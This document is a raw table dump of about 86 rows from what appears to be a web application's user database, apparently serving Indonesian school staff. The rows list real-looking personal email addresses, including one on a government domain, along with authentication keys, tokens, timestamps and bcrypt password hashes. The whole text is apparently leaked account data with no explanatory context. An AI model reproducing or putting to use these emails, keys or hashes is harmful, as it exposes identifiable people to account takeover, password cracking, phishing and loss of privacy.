| 1272 | NULL                 | pelita.bersamamandiri@yahoo.com                      | 2        | ZanuGoxxMifPyPIq4S6bazK5adaSCRzx | pelita.bersamamandiri@yahoo.com  | 1705586164 | 1629932642 | 1630568405 | RY0080qkYeDbDaAi7H-zatTk4n5_V4-tcytsm_p2 | NULL         | $2y$13$O60E4uHsVHKmNQtpr7GOkebK5HP8Oa64L19tj.tuhHcoQFmwz3Bpa |
| 1273 | NULL                 | yasarahstore@gmail.com                               | 2        | g1Jo2W8Vdfbmvl2_NuSGqTrzQfzn4ZDQ | yasarahstore@gmail.com           | NULL       | 1629938344 | 1629938344 | jDROixnsr2tQUzfHChSJG7K9QK4qJMrBLmeG8Rg0 | NULL         | $2y$13$N92DKUW9rdsWr18Vqb5Qpez17PmGdN28r5U0u7dhtz8KdUzsmqqeO |
| 1274 | NULL                 | zuraidasyafril@yahoo.co.id                           | 1        | mpS5zfhUyDBQlVx424l91WhVzJ8Nir7g | zuraidasyafril1963@gmail.com     | 1671508296 | 1629939325 | 1671508294 | 3Q3BmOnm75UjpGmxMgXUUHkBrmY8PWB4Q66eMCIi | NULL         | $2y$13$LvVt.dxeXV2K7lO4M52AX.vWqKnRFcNHtyjMgia8zxV3aINUXkMkm |
| 1275 | NULL                 | prisubektigembleb2@gmail.com                         | 2        | 9TLD09RHT6mwMuFBxnbAtur0g67hC67g | prisubektigembleb2@gmail.com     | 1637640369 | 1629939643 | 1637640369 | 5h64vHXAfFf1FVgFovcHDjZmqOQGoaZB9fMX4jfI | NULL         | <blank>                                                      |
| 1276 | NULL                 | niningynsh70@gmail.com                               | 1        | ypYjfdbjXPBYcr28lrpkEnWgj6ZXwaYQ | niningynsh70@gmail.com           | 1700055371 | 1629940086 | 1699926226 | 1595lv6AMQiKiQ6dBbFCCoVi9tBexCJppzZK4MzI | NULL         | $2y$13$CVL5/nKpcMhFrgF/XlcbVe38Ne0aKAdJYqBGC4idRWNzVsZc3QB7O |
| 1277 | NULL                 | hnurhasanah539@gmail.com                             | 2        | CQUYcZfokpLhnzyEiMcORdI9f4aF6Ink | hnurhasanah539@gmail.com         | 1629940236 | 1629940235 | 1629940235 | 8EMyyNUHatWKPcm2N5WKZ2CcZzDh6IV8zgyJFJKd | NULL         | <blank>                                                      |
| 1278 | NULL                 | jumiati64a@gmail.com                                 | 1        | 5s23SkM9OMBucBGh6cX4PQ7SsgjeoWuz | jumiati6506@gmail.com            | 1640846803 | 1629940540 | 1640846801 | 1kgY55U7WOEiIg9QzHHcP2Y1DZ954G1XryHew7qx | NULL         | <blank>                                                      |
| 1279 | NULL                 | enungn910@gmail.com                                  | 2        | 91SLmL8YekFJazYK3MqjOdpHeufsLYJ4 | enungcimande05@gmail.com         | 1640148045 | 1629940547 | 1640148044 | SvP3iAue36IWcfWAd9CblcIou07BMwvtReXyRXp3 | NULL         | <blank>                                                      |
| 1280 | NULL                 | masruroh2603@yahoo.com                               | 1        | 4ujVRAY4aCbxZmqTtuw4N4OBXgvuJq0f | masruroharfan49@gmail.com        | 1721452839 | 1629940888 | 1721452837 | JTPr8K1xQclTJTIPwpfMAfJvTXN4O03GTVxAW7AH | NULL         | $2y$13$HIoLKrmepIFl6/mAZy3.UepEhrP.Er4sVmdou7gRUTKUaSqUN49pW |
| 1281 | NULL                 | hromli72@gmail.com                                   | 2        | KrW8WqxyxYqchiFtdh0ET6GrCvsz0Rru | hajiromli1965@gmail.com          | 1684132585 | 1629941854 | 1684132584 | M9ST14WGV7ZnPcU3QLMbTGVmXZHLeU4njajWzRM9 | NULL         | $2y$13$E0.XSIpXUyjtDEHM57QtF.kLW80XCj3F2dfBX6HEzaCXuERWdKwMG |
| 1282 | NULL                 | syahridogautama0@gmail.com                           | 2        | p6P34WwO6SbMyC4epT4AOMpJy_lfwwge | syahridogautama0@gmail.com       | NULL       | 1629943074 | 1629943074 | p4W98dk528A0WzvshB19tM7x9I7I3v1aDGK1tTlQ | NULL         | $2y$13$2MuqVcBQEKp0DBhhrArBHOWA/Jsqaihuu3YaI5t542tmOHO1cwSzy |
| 1283 | NULL                 | hendriyanto.m01@gmail.com                            | 2        | 4Ybuq6FItDY7ce-VNo8ZDTtUM28c08Dc | hendriyanto.m01@gmail.com        | 1632362576 | 1629943992 | 1629943992 | __68QDQtpcEeq0usO7S32r1vVBZtmXpd_w3fVTRL | NULL         | $2y$13$b2Jx5YWg1o0XqIz1z4Ysv.Y2FtMt8n0mlVersrOTpZ414EYAFE4Bu |
| 1284 | NULL                 | sentrakriyapt@gmail.com                              | 2        | fEyzR8tDBSM3w-KZno6KA1JPR4U3Kjod | fiskal_ske                       | 1721443073 | 1629946700 | 1629947607 | JHeU7_AHOBEFo5OQLnVEH-D1iid1ijly_nXsGhrA | NULL         | $2y$13$3aKrxWSfYMszdydOQFswjOrhSP1q/PmDJeKU.oVHkt/IqvwtyGl6a |
| 1285 | NULL                 | santrimanpamotan@gmail.com                           | 2        | TNEa1z2zxdjQfHuoNBSWA3xoCgk60cmF | santrimanpamotan36@gmail.com     | 1704894060 | 1629947552 | 1704894059 | 0yJ6n8jGOK5JQqBpkISC3eOXiCwK5nJk9yyKcikr | NULL         | $2y$13$PUkJrD1Hx4MAdBqpIhQM4OqFz594toQXHfLYJ859kvbtD9kWRFAH. |
| 1286 | NULL                 | apsara1.pt@gmail.com                                 | 2        | ILKyU_udHXGNSme2bEzSxWMR7dgR90Cx | Didik                            | 1719893459 | 1629949164 | 1629949164 | 67lRxfBQmx4sfLBaN_-digCor2KqZOqD8wFJ8itT | NULL         | $2y$13$Na5OhDZWHCEhvNz92rsB8uTaVyPJFseFAdu.D8AzSCNLHuoWGBOQu |
| 1287 | NULL                 | lakmizarspd1965@gmail.com                            | 2        | LMp1Dm6XEJCQmwzKPiIw2CeuTVSIjIFN | lakmizarspd1965@gmail.com        | 1630546439 | 1629949556 | 1630546439 | dT0aNfGIHvGigJuJZTzOlrPRpDC5atqAvhyY5XID | NULL         | <blank>                                                      |
| 1288 | NULL                 | ayahebila@gmail.com                                  | 2        | TISby2suQ1jZMWSGCoaA2uN6HpaokOXD | ayahebila@gmail.com              | 1638343905 | 1629952230 | 1638343904 | XfSuTdM5I6m4w1rcL9czeaU10CavfzASaay496mZ | NULL         | <blank>                                                      |
| 1289 | NULL                 | hairulsobri967@gmail.com                             | 1        | BN9cuiwXWplWnHvSgqY4VoZtqOw0bGW2 | hairul.sobri101@gmail.com        | 1719804437 | 1629952269 | 1719804436 | 9vgiFC5Bi3KzUlXfgKwGw8WLftVOli5InmOI5gyS | NULL         | $2y$13$WXapWmg8tBKGw91T2aBLveInqwULVTY19mbaFu/tBwSPxHoXT6EfW |
| 1290 | NULL                 | anggodamel@gmail.com                                 | 1        | 9CHch0TqWqDkLhOoOwBi3fce44dyAYWm | hartono.anggodamel67@gmail.com   | 1715037506 | 1629952279 | 1714985664 | ZQFQDIduFJNtJwxVZAZpwJvZtk4C5Tp3EE0E4pjU | NULL         | $2y$13$XuSac.ehyZxqcuXGnu2gP.aYCXEfaYzJi/UEtzVG1b8FeYkh3Ed9W |
| 1291 | NULL                 | yurnalis1964@gmail.com                               | 2        | tLqjtxcxOqXtX9E13ShyRYLAdONyxZiX | yurnalis1964@gmail.com           | 1674698126 | 1629952350 | 1674698125 | Y2z2FMrZbClIpQ7ZN8DZw9eThrGz93eP0tQq5SQx | NULL         | $2y$13$EsLVLBO/MXF7f5sSy2YcCeaqOmchwqGCqYW4DkHsPPvu8g7AUqSD. |
| 1292 | NULL                 | wachidbudiono196805271991031011@gunungkidulkab.go.id | 1        | 0Oj8VwzXhLWJoRP5snI3QniPpiHtILB6 | wachidbudiono196805271991031011@ | 1629952374 | 1629952368 | 1629952368 | CimJAxr13mUFkqsoSPBCeobGUodb0d24eMWKE44A | NULL         | <blank>                                                      |
| 1293 | NULL                 | soemarman67@yahoo.co.id                              | 2        | z58hrrAecmpWaBTiyuFg1Pka43IJg5n2 | sumarmandrsmpd@gmail.com         | 1668053913 | 1629952396 | 1668053912 | mIcsvk3ibTcrWsZNmWFXlykxaeQa0Z8zV5qLq538 | NULL         | $2y$13$eJzPiW7ZYxfTNdEJv992s.ItpRSPNEtYU7H1gfPxsien2gVPcpG9u |
| 1294 | NULL                 | masdiantiranti@gmail.com                             | 2        | iyer9O45C9qZUzcdfX9GRGuPi2B2YZYx | masdiantiranti@gmail.com         | 1631843967 | 1629952469 | 1631843967 | mL8SdVVajSD2MnTPnL5P0FG1qlaIvr3S1CZNu2qp | NULL         | <blank>                                                      |
| 1295 | NULL                 | suparyatmo80@gmail.com                               | 2        | dRePnFjBUKG6RBWHApiHnxkirbaPwLTV | suparyatmo80@gmail.com           | 1650682561 | 1629952489 | 1650682560 | yl1inBzUzjhbkDxFFCKs6NJyjOW3NztxAZsMl10D | NULL         | <blank>                                                      |
| 1296 | NULL                 | srimuji_l@ymail.com                                  | 2        | nVhWh0aD2cuLefMNqoVJ8hqulYWYpAeF | srimuji626@gmail.com             | 1699667019 | 1629952506 | 1699667017 | dYAom9P7x3JRIxDDbSDrdQtWzb1sG6XbidjukXfu | NULL         | $2y$13$KT3F6ve64xCYqWcZmplrfukx6gGC3hcnGlr9ny6Zkxyx9VnSTAJY. |
| 1297 | NULL                 | yadimulyadi1963@gmail.com                            | 2        | 9QbUAj2Pp9HVga0Lc9EkdRuMGCWUSEfP | yadimulyadi1963@gmail.com        | 1632881970 | 1629952525 | 1632881970 | 6L8B1KB9BBqLCrEPqo8x6MB4j4pmlPru1jp75t7R | NULL         | <blank>                                                      |
| 1298 | NULL                 | suryani754@ymail.com                                 | 2        | buQe2wDbmbNolD5wuZElkjuUj86J4uiK | paksurpandansari2@gmail.com      | 1721609056 | 1629952557 | 1721609054 | vGQzYbBgJWVySJY6DZ4C72IHGgB6EPgINfzgIGXC | NULL         | $2y$13$x1vqU9QwsvNX1eO9RyOIMuj0lh5dWa8WjXg.IHwdIL0WfCf.nIYiy |
| 1299 | NULL                 | rusmadi_pkn@yahoo.co.id                              | 2        | WWFjbJNGJRPxeGX6ggvbZxRE71tb7Qte | rusmd06@gmail.com                | 1643084349 | 1629952631 | 1643084348 | 6C0bjmTGNky0zfp1C7KTBX6RjCwY73yR5TWBBiWi | NULL         | <blank>                                                      |
| 1300 | NULL                 | wahyuwidayatisd@yahoo.com                            | 1        | ljSzcb7HW5fjHMi4MKaAe2yt0V1SI0z7 | wahyuwidayatisd@yahoo.com        | 1670833860 | 1629952754 | 1670833858 | iaJ58I8ydAVuJaVQsyJzILPvNDQvvTIMyMSQJMWw | NULL         | $2y$13$80Hkz/0vfyebE5WtCrMlau4jYQsDNpZDBCoCSET7hGoud3WSo8/Ai |
| 1301 | NULL                 | darmanjoyo@gmail.com                                 | 1        | sKLU4A7bsnIwRrZphZ74NzxcDVLL5w08 | darmanjoyo1@gmail.com            | 1631065221 | 1629952781 | 1631065220 | QkcePHoxVeIf3FDLWYevrrY60C4I4vsoZjpfaq6h | NULL         | <blank>                                                      |
| 1302 | NULL                 | nurhadilatitol@yahoo.co.id                           | 2        | U6RUDsqoEuX2RNBDubSAAQPfMP6ff4Ud | latitolnurhadi72@gmail.com       | 1646632505 | 1629952809 | 1646632504 | CTuZ58zEnnZnRxTrxLPQ7yaRck2opvbJZYLi9TTS | NULL         | <blank>                                                      |
| 1303 | NULL                 | widjajatieko59@gmail.com                             | 2        | ADZlYrYno7rHqWA6fo4mf5HZZe4Bleq7 | widjajatieko59@gmail.com         | 1637815424 | 1629952837 | 1637815422 | NXpDQP44GbxApARkD9IXsGmlHmXiRZ4T1Pk06Qbc | NULL         | <blank>                                                      |
| 1304 | NULL                 | budiwinarta92@gmail.com                              | 1        | 9rWhskE7SF7OIvWVja1kRJTjdZE9nIj6 | budiwinarta92@gmail.com          | 1631256907 | 1629952862 | 1631256907 | Z9HBvtx4w9XtmoyIxQelqLNtqqVR9abqamh4Dk78 | NULL         | <blank>                                                      |
| 1305 | NULL                 | ayunursejati@yahoo.co.id                             | 1        | 5xNUIVM3yYlZJfLTEur9MktrQPK1ewYq | sukasmi06sukasmi@gmail.com       | 1630306193 | 1629952879 | 1630306193 | ZrqObltP2f7ml5svf63Qw2lwIf270X7K0Bp6OrFD | NULL         | <blank>                                                      |
| 1306 | NULL                 | jufriadispd720613@gmail.com                          | 1        | M1GSivGtzHtVwYCPEpGTVRdo8MWEX3OA | jufriadispd720613@gmail.com      | 1722231295 | 1629952906 | 1722216291 | iGYjbwTA1EUpgEzktYpMz5xN5o7ejGrOyv9naAW7 | NULL         | $2y$13$FYf7mrSfTnLuF3uzYhwtiOZWDF9sFcyPk5ltl2gQhpPL7sz0f8l9e |
| 1307 | NULL                 | yurnitayun3@gmail.com                                | 1        | mS3CPamNttGF8yyujrxL9DeZXurZai47 | yurnitayun3@gmail.com            | 1629952918 | 1629952910 | 1629952910 | HpLhoCUihkQJMrGok6RUKW47SrXtj9d6RkKraM5E | NULL         | <blank>                                                      |
| 1308 | NULL                 | ronisman1krj@gmail.com                               | 1        | eWHjAcY7R7VHoQBLHBehUzJTUoWCetNX | ronisman1krj@gmail.com           | 1629952921 | 1629952911 | 1629952911 | wG3E6mz4ZezXY5ItNktGN6o2cHCGDPdRKq5nWT6P | NULL         | <blank>                                                      |
| 1309 | NULL                 | antono.s.pd@gmail.com                                | 1        | TBFjicdkw00d0BboNQ37rk2cIPaD2gPj | kuyubia9@gmail.com               | 1630369913 | 1629952920 | 1630369913 | huR4AzgjkUvUMjIhiMnymZZ0yS5hEDIe9VRMNRaQ | NULL         | <blank>                                                      |
| 1310 | NULL                 | Norapita92@gmail.com                                 | 1        | 6KGEodxvLT6VkPOZCqKajXqJD9KNIacY | norapita92@gmail.com             | 1670919922 | 1629952964 | 1670919920 | wbUmZnfxNNMfmu2yQyZdrdfboM2OlfUjJDoAvPAY | NULL         | $2y$13$ZxQPcWar5nzb4iVTqvv6desR59PawWnMXymBixK30QA4N5MToiti6 |
| 1311 | NULL                 | ainahnoor17@gmail.com                                | 1        | eu0YgLz7O0stUvxEPduDMeUNSmtOve5T | ainahnoor17@gmail.com            | 1634778266 | 1629952976 | 1634778266 | PagnDuyL9fxsUVSDyVsAMIKiKO1KrryzSnVXkj45 | NULL         | <blank>                                                      |
| 1312 | NULL                 | pairin.sbg64@gmail.com                               | 1        | HtcbacRwb1foMfbnBqOmNlBKOe8NmWax | pairin.sbg64@gmail.com           | 1629952993 | 1629952987 | 1629952987 | RWJD3nvVtizRxdXyWlpDydIYSdquOFJcjGYhHxnv | NULL         | <blank>                                                      |
| 1313 | NULL                 | yayasukria@gmail.com                                 | 2        | UXhCyi8u8VkNy8Ak8kLa2xm0MGtYJdc6 | ketuapkbmmekarmulya@gmail.com    | 1630220619 | 1629953006 | 1630220618 | QJgFGTF7hoZEZ0V2b4L4ezXgYxkFPGuF03IylVwD | NULL         | <blank>                                                      |
| 1314 | NULL                 | xaragihelimanson@gmail.com                           | 1        | BP6nJ95PuHyzdXzaAczWevqkDyH91bpg | xaragihelimanson@gmail.com       | 1703041267 | 1629953062 | 1703041265 | ssDK9gpThmnq7ehVsXUuYsZAWcCLfBWBfwQ9ostE | NULL         | $2y$13$1aJH2KJdwdFl0VOAYWL/t.V8Am.huSHnVltf8TplCwqHap.ZU.V.6 |
| 1315 | NULL                 | agustinadwiprasetyorini@gmail.com                    | 1        | VKkBUOtxxCMQV72jxTzuKoenWXj1SntU | agustinadwiprasetyorini@gmail.co | 1629953073 | 1629953065 | 1629953065 | Xqw7cZml0ET2FwzsLhnXHVE3M8q0Riyq5Ccn6aD0 | NULL         | <blank>                                                      |
| 1316 | NULL                 | drayusnaizi@gmail.com                                | 2        | 9kUpqZyq3lSd7FkwXqgs2oTszRIF1Aye | drayusnaizi@gmail.com            | 1648024879 | 1629953080 | 1648024879 | DoBv8Tn7ZKIsNTNHsljDTXGrHE9KpJJETeuu5t9V | NULL         | <blank>                                                      |
| 1317 | NULL                 | marianie_hanua@yahoo.co.id                           | 1        | TGmsKCuA7sPjY0coZEnqq3XHmJA1JVyJ | smp2btdapodik+1@gmail.com        | 1629953098 | 1629953090 | 1629953090 | jYmFoZpSd1BbWBcOcWmrVu9F7nkJ1gtFEx3jbtAD | NULL         | <blank>                                                      |
| 1318 | NULL                 | elisa.ramli81@gmail.com                              | 1        | v8scwz2QOk7mLQ3NyfpOCYBUZEoGc6Tz | elisa.ramli81@gmail.com          | 1668670181 | 1629953098 | 1668670180 | tlDQZdQu9nAn6QXwYNGQ9LEI0GxQMwwLczyqxLcU | NULL         | $2y$13$n8g/VVAvN5gmh7krKBb7puFbD5vqwJC5nDS6Gu9s05YLNgBop53Im |
| 1319 | NULL                 | bambang1969@ymail.com                                | 1        | W62LamtlEtM4hWRUP0ThHQuUXWowpMyp | bambang1969@ymail.com            | 1680924427 | 1629953121 | 1680924426 | 9iU06I1afM4uVQClpUCJxKFLDZO7L04ZREkOC2Ox | NULL         | $2y$13$BDwHLH63XqaZyhyC7Flp/OQyNDsI5SvN1za9fZTygHXOwIV5nuf.K |
| 1320 | NULL                 | ks.sdnmagalauhilir@yahoo.co.id                       | 2        | KZZFHJIcrx8z8obmgKCJmF7gasupyryq | ks.sdnmagalauhilir@yahoo.co.id   | 1636354326 | 1629953144 | 1636354326 | n8ec1CuzSJASlUqT2wzHaa6pN78TfAldagwuCTnZ | NULL         | <blank>                                                      |
| 1321 | NULL                 | sujarwokpp513@gmail.com                              | 2        | 4VY0G8b00OsTwsbKk0snJvYhBT5Bvbnm | sujarwokpp513@gmail.com          | 1640048090 | 1629953151 | 1640048090 | bx6gffnMhw49PcMMQ8m5eE85CH7qYz95rbsbMfYt | NULL         | <blank>                                                      |
| 1322 | NULL                 | euishikmah55@gmail.com                               | 1        | mXDHdWF5QEFqBBXRrGMmvrHxjF2DOT0j | euishikmah55@gmail.com           | 1656995028 | 1629953176 | 1656995026 | 4rtQGVgxSLbgp9slflcUQD2Q36z2r99T8lDjlVfv | NULL         | <blank>                                                      |
| 1323 | NULL                 | kepsekkomaruddin02@gmail.com                         | 2        | xaBJELkIwhoqQdTF1qcdSVwIGfTidv1q | kepsekkomaruddin02@gmail.com     | 1646792715 | 1629953178 | 1646792715 | s5FfgyVVSq0OVaUAHyuenS0LSGrzVlLgVALWWGRU | NULL         | <blank>                                                      |
| 1324 | NULL                 | sukirman25362@gmail.com                              | 1        | mVxgcaelCk4cnmstdChPJqyAyoP4NTOJ | galyh663@gmail.com               | 1663461696 | 1629953236 | 1663461695 | Z6Dd1LrjhwbFn5y1fojfi4SHnuudifu3kPhyDyKm | NULL         | <blank>                                                      |
| 1325 | NULL                 | indrawatihj71@gmail.com                              | 2        | JT6JcgWxxTU94hny3bnDwRa4U4Ts28UQ | indrawatihj71@gmail.com          | 1654648096 | 1629953240 | 1654648095 | OTIyodJTLtCI1334oRVovS6AFYMw1jSaQzz7aj5t | NULL         | <blank>                                                      |
| 1326 | NULL                 | deddywarasusandi@yahoo.com                           | 1        | GP9IrxAAL58sK6sGRDCvAoZcWnQvUrjF | deddywarasusandi@yahoo.com       | 1639714207 | 1629953256 | 1639714206 | SIyBiFA6UrmsdrFzZ1ItZd6Lu8yNdroIgOQbpFl0 | NULL         | <blank>                                                      |
| 1327 | NULL                 | mustapaahir@gmail.com                                | 1        | MP6qpvKj2HLyXJNWHSmEBN68A8pxn6O1 | ewan.lahabu@gmail.com            | 1705094286 | 1629953273 | 1705094284 | dxAuO6FJzkDeGvnbSjaZVczo8C5o7XE1DkxcD1HC | NULL         | $2y$13$E3Nbl5U1hOC2YtR3V1PY7OqCo7GB94kJH2b.yUYpWi/e34SFYJkCC |
| 1328 | NULL                 | muhammadidris1013@gmail.com                          | 2        | tCT03B94WtsXZ5soHEvodlUIVWIQ9Nm6 | muhammadidris1013@gmail.com      | 1721790818 | 1629953326 | 1719235741 | O9zd5SQQJ67qBkxiyUDtmytDyDZycnZQIsoF2aTf | NULL         | $2y$13$uF6jDQvVOvongZ7s62vsBu9k8pHxXTZ2EeaqFtiBqg.SchEIaupbi |
| 1329 | NULL                 | arrahmanman67@gmail.com                              | 2        | MyB103ALY5F7L677wj41Kf3C60xeWHD9 | arrahmanman67@gmail.com          | 1674633948 | 1629953388 | 1674633948 | H0YHlu8JeRIDeV5eubCYeegAEP5zExD3DNOUfU6E | NULL         | $2y$13$k4JpO4/LZKTPJIY8LIwFneJyc.3mYcxLMKgc9e2tbT5P.bQMOuPOC |
| 1330 | NULL                 | suwiknyospd62@gmail.com                              | 2        | pMseAMEB4O1OWkxLXoI2wh2htud3bR1d | purwenipogalan2@gmail.com        | 1629953470 | 1629953461 | 1629953461 | 1MYetcPcrHAgT9Woy3LpdclDDw9zbGPEY0IzX7zl | NULL         | <blank>                                                      |
| 1331 | NULL                 | neniguteri@gmail.com                                 | 1        | XqXXHxIKz7S1ff5BpTvlWx0xkpaKbtcI | neniguteri@gmail.com             | 1653961798 | 1629953465 | 1653961798 | DbqpjYTB0qi6FImqBygoi4YdbtopCLhg1lModErj | NULL         | <blank>                                                      |
| 1332 | NULL                 | mardisianturi8@gmail.com                             | 1        | 6TYMCZV8SrLcmRfcWFRlcuNdcBMYuFOy | mardisianturi8@gmail.com         | 1631585275 | 1629953517 | 1631585275 | IwtgVI0uyPfh5Jx4S9T2xL57ZGJiGNQyiam6YJIl | NULL         | <blank>                                                      |
| 1333 | NULL                 | andarahman@yahoo.co.id                               | 2        | 1HTiJMMTXpdpk2kHkqWff4WaduKPh9Oc | andarahman@yahoo.co.id           | 1720748031 | 1629953527 | 1720748029 | 13oJoxvp4UtZv2GT1J7XTd8Qm3R9onDl1Lc0Y2Eh | NULL         | $2y$13$z38kJXyUCU0FxARVAuA20O7UKMplwKFk3bjkULIwg.OTLcZVmiCQa |
| 1334 | NULL                 | mariaustazdah@gmail.com                              | 1        | rpLnhDrQnSFD3YF8XZ8NNKu04B9iv4MK | mariaustazdah@gmail.com          | 1652320144 | 1629953622 | 1652320143 | aZADqUw7Dc3cWmeZsZiOvEbujZZxIOmetWhGpfKg | NULL         | <blank>                                                      |
| 1335 | NULL                 | kamaruddin_rate@yahoo.co.id                          | 2        | eqMMq39scNZcgcXILOovu9eoaOZMGeJE | kamaruddinrate15@gmail.com       |            | 1629953628 | 1629953628 | EcOjeXROtVxqk2AKpVlMsHJfx1MtfKtEd5HKxPOK | NULL         | <blank>                                                      |
| 1336 | NULL                 | kalamsyah_1968@gmail.com                             | 1        | 1EuswKxT9MhnSfXYjE4sQiC0KRJxzUGq | susanenget2@gmail.com            | 1630243553 | 1629953749 | 1630243553 | Eey9OomhT28jnmREnpkONolLSN85lAS5Lj9WnsCQ | NULL         | <blank>                                                      |
| 1337 | NULL                 | sriyantimagersari@gmail.com                          | 2        | zyuHQQDhD8lbxNDg2dUGfMQ9QDroZ7p3 | sriyantimagersari@gmail.com      | 1716857769 | 1629953756 | 1716857766 | iFondyVEeYmZi8z77vBRc2crqr8VSKgJlldiocyM | NULL         | $2y$13$/NXY0aAPG5wycmXBlnEEdutrVS/VO8R129iRYmg9XSVPYxSIi1ohy |
| 1338 | NULL                 | aniesrohmatul@gmail.com                              | 1        | EujfGOE7h23bFBqqTBA28iXtKUQ1Mqyi | anies17mataram@gmail.com         | 1635382561 | 1629953764 | 1635382561 | EYd2pm8DXVFkzrOcFsX1nrhbp7LmlV4EyE1XEVg2 | NULL         | <blank>                                                      |
| 1339 | NULL                 | muhibatulmuharomah10@gmail.com                       | 2        | 6GfDYh6pLUoOHdfZAG5YjDccZSaCnAx5 | muhibatulmuharomah10@gmail.com   | 1640857460 | 1629953769 | 1640857458 | D31PKXliTOFYzcQ3yXGKuRQ2adnkMv0B1wtv0RJ8 | NULL         | <blank>                                                      |
| 1340 | NULL                 | suparmiati05@gmail.com                               | 1        | BYB3zc4OSM6qIsOTK81MlYvXPFPbBCX5 | suparmiati05@gmail.com           | 1632964936 | 1629953773 | 1632964936 | T3FHPnhloS4GUdAiQ8n1yeG5xKZPNNkQimMcZpew | NULL         | <blank>                                                      |
| 1341 | NULL                 | drsmasduki500@gmail.com                              | 2        | rSBlBkTJNfpFaINWeId80o8Rckc53kr2 | drsmasduki500@gmail.com          | 1635154390 | 1629953794 | 1635154389 | YPMqvd6lFiWleWKHOTiCQM3HSTtZqNPGOHxC7kTo | NULL         | <blank>                                                      |
| 1342 | NULL                 | muslimidatul@gmail.com                               | 1        | 6SLg9iboUIZGTQbr7qfM40i1nVSISq8u | muslimidatul@gmail.com           | 1719474619 | 1629953923 | 1719474617 | 4A0pFlRGchgybRXXTVA9gpOUeQnpu2cJT4wR1saI | NULL         | $2y$13$5Rt8h3/Ex9kcBpDM8yND/eCdk4opVRSNSg8WqxwLdw9VSn0W9oQHW |
| 1343 | NULL                 | hambalinur0@gmail.com                                | 2        | NKlWY1ZWiJFzYkCv9k0xBNUrxRWp7PJi | setyorinidyah741@gmail.com       | 1637733148 | 1629953986 | 1637733148 | 7aeQx6gRA4SJBZYnCGGDFQP9pTqSvf8S8jqdur5g | NULL         | <blank>                                                      |
| 1344 | NULL                 | sariahd7@gmail.com                                   | 2        | c6QfgByKrqYkUGRmO7Jm8mmJpWjq0n0h | sariahd7@gmail.com               | 1639449639 | 1629954015 | 1639449639 | dqnyYEMHyoCpP7tyjr8fZjX2LaXdqMcTpYOXLSmD | NULL         | <blank>                                                      |
| 1345 | NULL                 | henochmidi08@gmail.com                               | 2        | AjsArz2Zwvw1F8AIixKCidDazxU3efGl | henochmidi08@gmail.com           | 1713918830 | 1629954025 | 1713748818 | 6crS7DHElh3rJvhYFVybeBNY0xtaJatV2X2amhKV | NULL         | $2y$13$z5t4Jw4.AfTobq.dD2XTyue//Jpm8O3/cS3XLxUdixuW3Xa0RFWwa |
| 1346 | NULL                 | e.purwiati@yahoo.co.id                               | 1        | 0shBODJCztRHir0KDQLsSotlTvu4d1L3 | enipurwiati1962@gmail.com        | 1659947308 | 1629954066 | 1659947307 | ns25za3WUcQmsTxhbGPh0YuaDOXBMOvxS1BElW1O | NULL         | <blank>                                                      |
| 1347 | NULL                 | halimi171962@gmail.com                               | 1        | 8qNRLVfSjuovmXJErTZ3nEZsfurmz0Qe | halimi171962@gmail.com           | 1655478138 | 1629954084 | 1655478137 | gN8NYxV1fJ8MGY7zzoC7uoiLTINFlAKsIBRE1EM5 | NULL         | <blank>                                                      |
| 1348 | NULL                 | NULL                                                 | 1        | hg0MuIpyPQpm2ugZx7VizuLxVcYiN2gh | lilian.kadarsih@gmail.com        | 1629955311 | 1629954154 | 1629955310 | 61elSdYwzSogOsjSRYfyluwcufFvlmUu0A1v1T0Z | NULL         | <blank>                                                      |
| 1349 | NULL                 | rudiyantospd128@gmail.com                            | 1        | cxB0X9An4A0tUhMbOuY5XgFt8d03kJm1 | rudiyantospd128@gmail.com        | 1719223705 | 1629954157 | 1719223703 | m40r5gT88XAYyMM48u1rPYUKaPp8SEYMWJ1RBAEC | NULL         | $2y$13$MYxmGJ64x0cMq2ULGGk9FelDYUQ7PJrB/gaEvxHYNj.OYKpE7IxVi |
| 1350 | NULL                 | ttumino897@gmail.com                                 | 1        | LyQ32xWdlYH0GYtuigOp4uxA19kxrHfk | ttumino897@gmail.com             | 1641614508 | 1629954225 | 1641614508 | 3vYa9CDBhQa7ZyUod4VX1eNAgsNMvEodnMwsaUTf | NULL         | <blank>                                                      |
| 1351 | NULL                 | destiwatiherlina@gmail.com                           | 1        | ySlW7odxIJ9xHG1Vibv4nipqS4HV1ecs | destiwatiherlina@gmail.com       | 1711692846 | 1629954336 | 1711692845 | oGKpsrS3F2wEHyUMCxnzV81elIs6OHPhhjjIgRjj | NULL         | $2y$13$hY4mYGvKsnVpZdCh2gYEZOQGZaYqxejmr5qP6HBfdNaHkPF2C3dAS |
| 1352 | NULL                 | spdimaladi@gmail.com                                 | 1        | 49zFOac07M7mAops8OZXFuKGgrUV9978 | spdimaladi@gmail.com             | 1719386994 | 1629954342 | 1719386990 | DcEFDAaGl0dvcsBn92SKTUDOhgmoRac1xtkMazfQ | NULL         | $2y$13$oAGunGKv3aBdazIBEVHTruxlwA0J7F0o9sBKPILJSHo8WNbqSKale |
| 1353 | NULL                 | mamansumani95@gmail.com                              | 2        | O26lw9mxVUfDb5gPdR0uK7ozpKL9maQX | mamansumani95@gmail.com          | 1635475694 | 1629954387 | 1635475694 | mCiK8MmrA2z3SXJThm7hQj1xtNs2DbsLtHCNC03i | NULL         | <blank>                                                      |
| 1354 | NULL                 | ruwiyati1962@gmail.com                               | 2        | 2J2wdXOMn2KCj6lAl9oSgbNOzxx09IUS | ruwiyati1962@gmail.com           | 1635923431 | 1629954437 | 1635923431 | cPBOUL2alIQxVuKAG9OuqpP4MHGnn0PVC0dTmENz | NULL         | <blank>                                                      |
| 1355 | NULL                 | ibuhadariah@gmail.com                                | 2        | Fg02gynLVWr66ekfIay3ffnCaVrJclgt | ibuhadariah@gmail.com            | 1633572375 | 1629954445 | 1633572375 | Bo3vZ2khAHbs6PlAep8RzlbWZU1xnv55f6iOnWtz | NULL         | <blank>                                                      |
| 1356 | NULL                 | ida.ronauli@yahoo.com                                | 2        | oc3NaMuggOS63rwqY6BX4aDnVsONAtng | ekafatimah212@gmail.com          | 1629954459 | 1629954449 | 1629954458 | A4zUW0NVtUClMsxwNbd0QwASf1L8tJa7C4niEFY9 | NULL         | <blank>                                                      |
| 1357 | NULL                 | lilismkn1@gmail.com                                  | 1        | dNYSOkKy2hRz71SWtlpcarxwTnvlEt1M | lilismkn2@gmail.com              | 1637019792 | 1629954486 | 1637019791 | 5mP6dEITPA819YQgUAHAWbajwrOEP1YmJBeKd8xe | NULL         | <blank>                                                      |
